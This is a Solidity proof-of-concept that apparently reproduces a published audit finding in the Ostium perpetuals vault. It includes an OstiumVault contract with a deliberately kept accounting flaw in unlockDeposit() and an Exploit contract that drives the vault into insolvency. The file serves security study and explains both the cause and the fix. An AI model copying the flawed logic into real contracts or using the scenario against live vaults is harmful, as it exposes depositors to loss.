// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Ostium finding 65199 (H-01):
// "Function `unlockDeposit()` adds discounted assets as traders profit and loss".
//
// Real audited source (embedded snippet in the report — the vulnerable block of
// `unlockDeposit()` is reproduced VERBATIM, the vulnerable line is marked @>):
//   protocol Ostium (perpetuals vault, gToken/gTrade-style share accounting)
//   report   github.com/pashov/audits .../Ostium-security-review_2025-09-14.md  [H-01]
//   fn       OstiumVault.unlockDeposit  (discount-socialization block)
//
// Root cause: when a locked deposit unlocks, the discount it was granted must be
// socialized so each share's redemption value drops accordingly. The code does
// this by adding `accPnlDelta` (the discount, per token) to `accPnlPerToken` /
// `accPnlPerTokenUsed` (the TRADER profit-and-loss accumulator), then calls
// `updateShareToAssetsPrice()`. But `updateShareToAssetsPrice()` only subtracts
// `accPnlPerTokenUsed` from the price WHEN IT IS POSITIVE:
//     shareToAssetsPrice = maxAccPnlPerToken() - (accPnlPerTokenUsed > 0 ? … : 0)
// So whenever `accPnlPerTokenUsed` stays <= 0 (the vault is over-collateralized
// because traders are net-losing — the normal healthy state), adding the
// discount changes NOTHING about the share price. The discounted shares stay in
// `totalSupply()` but the price is never marked down, so
// `totalSupply() * shareToAssetsPrice` exceeds the assets actually backing them
// → the vault is left insolvent. The fix is to distribute the discount by
// adjusting `accRewardsPerToken` (which feeds the price UNCONDITIONALLY).
//
// The vulnerable block below is byte-for-byte the report's embedded source
// (`Math.Rounding.Ceil`, `.toInt256()`, `revert NotEnoughAssets()`,
// `lockedDepositNft.burn`, `updateShareToAssetsPrice`). `maxAccPnlPerToken()` and
// `updateShareToAssetsPrice()` reproduce the gToken price math verbatim. Non-
// vulnerable dependencies (ERC20 asset, share ledger, locked-deposit NFT, the
// deposit / trader-loss / locked-deposit setup paths) are faithful minimal
// doubles with real transfers and real accounting.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Recreates the OpenZeppelin `Math` members used on the vulnerable line so
///      the reproduced expression is verbatim (`.mulDiv(…, Math.Rounding.Ceil)`).
library Math {
    enum Rounding {
        Floor,
        Ceil,
        Trunc,
        Expand
    }

    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256 result) {
        result = (x * y) / denominator;
        if (rounding == Rounding.Ceil && mulmod(x, y, denominator) > 0) {
            result += 1;
        }
    }
}

/// @dev Recreates the OpenZeppelin `SafeCast` members used on the vulnerable line
///      (`.toInt256()`) so the reproduced expression is verbatim.
library SafeCast {
    function toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "SafeCast: uint256 overflow");
        return int256(value);
    }
}

/// @dev Faithful minimal ERC20 double for the vault's underlying asset.
contract MiniToken {
    string public name = "Ostium Vault Asset";
    string public symbol = "OVA";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Marker token: the silent accounting harm (the vault's insolvency shortfall)
///      has no positive transfer to the attacker, so we mint the shortfall
///      magnitude to the SINK to surface it as the concrete harm.
contract MarkerToken {
    string public name = "Ostium Insolvency Shortfall";
    string public symbol = "INSOLV";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev Faithful minimal double of the locked-deposit NFT (only mint/burn used).
contract LockedDepositNft {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function burn(uint256 id) external {
        delete ownerOf[id];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the discount-socialization block of `unlockDeposit()` is
// reproduced VERBATIM from the audited Ostium source; the price math
// (`maxAccPnlPerToken`, `updateShareToAssetsPrice`) is the verbatim gToken model.
// ─────────────────────────────────────────────────────────────────────────────
contract OstiumVault {
    using Math for uint256;
    using SafeCast for uint256;

    error NotEnoughAssets();

    uint256 internal constant PRECISION_18 = 1e18;

    MiniToken public asset;
    LockedDepositNft public lockedDepositNft;

    // ── share ledger (ERC20-style) ──
    uint256 internal _totalSupply;
    mapping(address => uint256) internal _balances;

    // ── gToken-style accounting ──
    int256 public accPnlPerToken; // 1e18 — trader net PnL accumulator (unrealized)
    int256 public accPnlPerTokenUsed; // 1e18 — trader net PnL accumulator (used in price)
    uint256 public accRewardsPerToken; // 1e18 — accumulated rewards per token
    uint256 public shareToAssetsPrice; // 1e18 — current share price
    uint256 public totalLockedDiscounts; // pending, un-socialized locked-deposit discounts

    struct LockedDeposit {
        uint256 shares;
        uint256 assetsDeposited;
        uint256 assetsDiscount;
        uint256 atTimestamp;
        uint256 lockDuration;
    }

    mapping(uint256 => LockedDeposit) public lockedDeposits;

    constructor(MiniToken asset_) {
        asset = asset_;
        lockedDepositNft = new LockedDepositNft();
        shareToAssetsPrice = PRECISION_18; // 1.0, with accRewardsPerToken = 0 and accPnl = 0
    }

    // ── ERC20 view surface ──
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address a) public view returns (uint256) {
        return _balances[a];
    }

    function _mint(address to, uint256 amount) internal {
        _totalSupply += amount;
        _balances[to] += amount;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        _balances[from] -= amount;
        _balances[to] += amount;
    }

    // ── verbatim gToken price model ──
    function maxAccPnlPerToken() public view returns (uint256) {
        return PRECISION_18 + accRewardsPerToken; // PRECISION_18
    }

    function updateShareToAssetsPrice() internal {
        shareToAssetsPrice =
            maxAccPnlPerToken() - (accPnlPerTokenUsed > 0 ? uint256(accPnlPerTokenUsed) : uint256(0)); // PRECISION_18
    }

    /// @notice Total redemption obligation at the current price (supply * price).
    function marketCap() public view returns (uint256) {
        return _totalSupply * shareToAssetsPrice / PRECISION_18;
    }

    // ── faithful setup paths (not the vulnerable code) ──

    /// @notice Plain deposit at the current share price.
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = assets.mulDiv(PRECISION_18, shareToAssetsPrice, Math.Rounding.Floor);
        asset.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    /// @notice Faithful trader-loss socialization: the vault receives the lost
    ///         collateral and its per-token PnL accumulator goes more negative
    ///         (vault is now over-collateralized → price clamps at the max).
    function applyTraderLoss(uint256 lossAssets) external {
        asset.transferFrom(msg.sender, address(this), lossAssets);
        int256 delta = lossAssets.mulDiv(PRECISION_18, totalSupply(), Math.Rounding.Floor).toInt256();
        accPnlPerToken -= delta;
        accPnlPerTokenUsed -= delta;
        updateShareToAssetsPrice();
    }

    /// @notice Faithful locked deposit granting a discount: mints shares for
    ///         (assets + discount) worth to the vault (locked) and books the
    ///         pending discount. The socialization is deferred to unlock.
    function makeLockedDeposit(uint256 depositId, uint256 assets, uint256 discount, address depositor) external {
        asset.transferFrom(msg.sender, address(this), assets);
        uint256 simulatedAssets = assets + discount;
        uint256 shares = simulatedAssets.mulDiv(PRECISION_18, shareToAssetsPrice, Math.Rounding.Floor);
        _mint(address(this), shares); // locked shares held by the vault
        lockedDeposits[depositId] = LockedDeposit({
            shares: shares,
            assetsDeposited: assets,
            assetsDiscount: discount,
            atTimestamp: block.timestamp,
            lockDuration: 0
        });
        totalLockedDiscounts += discount;
        lockedDepositNft.mint(depositor, depositId);
    }

    /// @notice Unlock a matured locked deposit. The block between the markers is
    ///         VERBATIM from Ostium's `unlockDeposit()` (report H-01 embedded snippet).
    function unlockDeposit(uint256 depositId, address receiver) external {
        LockedDeposit memory d = lockedDeposits[depositId];

        require(block.timestamp >= d.atTimestamp + d.lockDuration, "NOT_UNLOCKED");

        // ══════════════ VERBATIM Ostium unlockDeposit block ══════════════
        int256 accPnlDelta = d.assetsDiscount.mulDiv(PRECISION_18, totalSupply(), Math.Rounding.Ceil).toInt256();

        accPnlPerToken += accPnlDelta;
        if (accPnlPerToken > maxAccPnlPerToken().toInt256()) {
            revert NotEnoughAssets();
        }

        lockedDepositNft.burn(depositId);

        accPnlPerTokenUsed += accPnlDelta; // @> VULN: socializes the discount into the TRADER-PnL accumulator instead of accRewardsPerToken; when accPnlPerTokenUsed stays <= 0 updateShareToAssetsPrice() leaves the price untouched, so the discount is never priced in -> supply*price > assets (insolvent)
        updateShareToAssetsPrice();
        // ══════════════ end verbatim block ══════════════

        totalLockedDiscounts -= d.assetsDiscount;
        _transfer(address(this), receiver, d.shares);
        delete lockedDeposits[depositId];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: establish a healthy over-collateralized vault (traders net-
// losing, so accPnlPerTokenUsed < 0), then unlock a discounted deposit. The
// verbatim block adds the discount to accPnlPerTokenUsed but the price is NOT
// marked down (it stays < 0), leaving supply*price > backing assets: insolvency.
// The shortfall is minted to the SINK as the concrete harm.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant PRECISION_18 = 1e18;

    // scenario amounts (all 18-dec)
    uint256 internal constant ALICE_DEPOSIT = 800e18; // honest LP
    uint256 internal constant TRADER_LOSS = 100e18; // net trader losses socialized into the vault
    uint256 internal constant BOB_ASSETS = 100e18; // real assets Bob locks
    uint256 internal constant BOB_DISCOUNT = 120e18; // bonus (discount) granted on the locked deposit

    MiniToken public asset;
    OstiumVault public vault;
    MarkerToken public marker;

    // surfaced results
    uint256 public priceBefore;
    uint256 public priceAfter;
    int256 public accPnlUsedAfter;
    uint256 public physicalAssets;
    uint256 public mcap;
    uint256 public correctMcap;
    uint256 public shortfall;

    constructor() {
        asset = new MiniToken(); // child nonce 1
        vault = new OstiumVault(asset); // child nonce 2 (VULN)
        marker = new MarkerToken(); // child nonce 3 (harm marker)
    }

    function run() external {
        asset.mint(address(this), ALICE_DEPOSIT + TRADER_LOSS + BOB_ASSETS);
        asset.approve(address(vault), type(uint256).max);

        // 1) honest LP deposits at price 1.0
        vault.deposit(ALICE_DEPOSIT, address(this));

        // 2) traders are net-losing: the vault gains collateral and becomes
        //    over-collateralized -> accPnlPerTokenUsed < 0, price clamps at 1.0
        vault.applyTraderLoss(TRADER_LOSS);

        // 3) a discounted locked deposit is created (shares minted for the bonus too)
        vault.makeLockedDeposit(1, BOB_ASSETS, BOB_DISCOUNT, address(this));

        priceBefore = vault.shareToAssetsPrice();

        // 4) unlock -> verbatim vulnerable block runs; the discount is added to the
        //    trader-PnL accumulator but the price is NOT marked down
        vault.unlockDeposit(1, address(this));

        priceAfter = vault.shareToAssetsPrice();
        accPnlUsedAfter = vault.accPnlPerTokenUsed();

        physicalAssets = asset.balanceOf(address(vault));
        mcap = vault.marketCap();

        // what the price SHOULD have become had the discount been socialized
        // (i.e. subtracted from the price base unconditionally, per the fix)
        uint256 T = vault.totalSupply();
        uint256 num = BOB_DISCOUNT * PRECISION_18;
        uint256 accPnlDelta = num / T + (num % T > 0 ? 1 : 0); // ceil, same as the verbatim line
        uint256 correctPrice = priceBefore - accPnlDelta;
        correctMcap = T * correctPrice / PRECISION_18;

        shortfall = mcap > physicalAssets ? mcap - physicalAssets : 0;

        // ── HARM ──
        // the vulnerable block did not change the price at all (socialization no-op)
        require(priceAfter == priceBefore, "price changed: bug absent");
        // and it left accPnlPerTokenUsed <= 0, which is exactly why the price did not move
        require(accPnlUsedAfter <= 0, "accPnlPerTokenUsed not <= 0");
        // the vault is now insolvent: outstanding shares are worth more than the assets
        require(mcap > physicalAssets, "vault solvent: no harm");
        // and this is caused by the bug: had the discount been socialized, the vault
        // would have stayed solvent (correct market cap <= backing assets)
        require(correctMcap <= physicalAssets, "not isolated to the buggy socialization");
        require(shortfall > 0, "no shortfall");

        // surface the concrete insolvency shortfall to the SINK
        marker.mint(SINK, shortfall);
    }
}
